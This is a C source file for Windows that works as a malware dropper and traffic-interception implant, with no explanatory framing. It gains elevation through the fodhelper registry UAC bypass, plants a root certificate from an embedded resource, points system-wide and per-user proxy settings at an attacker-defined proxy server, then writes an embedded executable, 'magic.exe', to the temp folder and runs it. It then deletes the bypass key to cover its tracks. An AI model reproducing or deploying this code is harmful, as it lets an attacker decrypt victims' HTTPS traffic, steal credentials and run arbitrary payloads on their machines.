#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>

BOOL installProxy(char *proxyAddr){
    HKEY hk;
    long lret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE|KEY_WOW64_64KEY, &hk);
    if (lret != ERROR_SUCCESS && hk != NULL){
        OutputDebugStringA("Error opening HKLM key %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
    if (lret != ERROR_SUCCESS){
        OutputDebugStringA("Error setting HKLM server: %d", lret);
        return 0;
    }
    DWORD dwEnable = 1;
    lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD, (const BYTE*)&dwEnable, sizeof(dwEnable));
    if (lret != ERROR_SUCCESS){
        OutputDebugStringA("Error setting HKLM value %d", lret);
        return 0;
    }
    RegCloseKey(hk);
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
    lret = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_WRITE|KEY_SET_VALUE, &hk);
    if (lret != ERROR_SUCCESS && hk != NULL){
        OutputDebugStringA("Error opening key %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, proxyAddr, strlen(proxyAddr));
    if (lret != ERROR_SUCCESS){
        OutputDebugStringA("Error setting server: %d", lret);
        return 0;
    }
    lret = RegSetValueExA(hk, "ProxyEnable", 0, REG_DWORD,(const BYTE*)&dwEnable, sizeof(dwEnable));
    if (lret != ERROR_SUCCESS){
        OutputDebugStringA("Error setting value %d", lret);
        return 0;
    }
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
}

BOOL installCert(BYTE *data, DWORD size){
    HCERTSTORE hRootCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_OPEN_EXISTING_FLAG , L"ROOT");
    if (hRootCertStore == NULL){
        OutputDebugStringA("Failed to open cert store");
        DWORD err = GetLastError();
        OutputDebugStringA("Error : %x", err);
        return 0;
    }
    struct _CRYPTOAPI_BLOB pblob;
    pblob.pbData = data;
    pblob.cbData = size;
    HCERTSTORE pTempStore = PFXImportCertStore(&pblob, NULL, PKCS12_NO_PERSIST_KEY);
    if (pTempStore == NULL){
        OutputDebugStringA("Failed to open p12 cert\n");
        DWORD err = GetLastError();
        OutputDebugStringA("Error : %x", err);
        return 0;
    }
    PCCERT_CONTEXT pCert = CertEnumCertificatesInStore(pTempStore, NULL);
    if(pCert == NULL){
        OutputDebugStringA("Failed to retrieve cert\n");
        DWORD err = GetLastError();
        OutputDebugStringA("Error : %x", err);
        return 0;
    }
    if (!CertAddCertificateContextToStore(hRootCertStore, pCert, CERT_STORE_ADD_NEW, NULL)){
        OutputDebugStringA("Failed to add cert to store\n");
        DWORD err = GetLastError();
        OutputDebugStringA("Error : %x", err);
        return 0;
    }
    CertCloseStore(hRootCertStore, 0);
}

DWORD initRsc(BYTE **resource, int resourceNumber){
    HRSRC hObj = FindResource(NULL,MAKEINTRESOURCE(resourceNumber),RT_RCDATA);
    HGLOBAL hRes = LoadResource(NULL,hObj);
    BYTE *lpBin = (BYTE*)LockResource((unsigned char*)hRes);
    DWORD dwSize = SizeofResource(NULL,hObj);
    BYTE* pBytes = HeapAlloc(GetProcessHeap(), 0, dwSize);
    ZeroMemory(pBytes, dwSize);
    int failed = memcpy_s(pBytes, dwSize, lpBin, dwSize);
    FreeResource(hObj);
    if(failed){
        OutputDebugStringA("Failed to copy data!\nError: %d\n",failed);
        return 0;
    }
    *resource = pBytes;
    return dwSize;
}


BOOL installEmbedded() {
    PBYTE embeddedData;
    DWORD dwSize = initRsc(&embeddedData, 1);

    char embeddedPath[MAX_PATH];

    GetTempPathA(MAX_PATH, embeddedPath);
    strcat(embeddedPath, "magic.exe");
    HANDLE hFile = CreateFile(embeddedPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hFile != INVALID_HANDLE_VALUE) {
        DWORD dwBytesWritten = 0;
        WriteFile(hFile, embeddedData, dwSize, &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    BOOL ret = CreateProcessA(embeddedPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    return 0;
}


int isElevated() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    DWORD size = 0;
    TOKEN_ELEVATION elevationType;
    GetTokenInformation(hToken, TokenElevation, &elevationType, sizeof(elevationType), &size);
    CloseHandle(hToken);

    return elevationType.TokenIsElevated;
}

int elevateProcess() {
    HKEY hKey;
    char payload[270];
    char szFileName[260];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    sprintf_s(payload, sizeof(payload), "%s %s", "cmd.exe /c start", szFileName);
    if (RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", &hKey)) {
        OutputDebugStringA("Could not create registry key!");
        return -1;
    }

    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
    RegSetValueExA(hKey, NULL, 0, REG_SZ, payload, strlen(payload));
    PVOID OldValue;
    Wow64DisableWow64FsRedirection(&OldValue);

    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);

    return 0;
}

int cleanup(){
    if (!RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command"))
        OutputDebugStringA("Failed to delete key!");
    return 0;
}

int main(){
    if(!isElevated()) {
        elevateProcess();
        return 0;
    }

    PBYTE rscData;
    DWORD size = initRsc(&rscData, 0);
    installCert(rscData, size);
    installProxy(PROXY_SERVER);
    installEmbedded();
    cleanup();
}
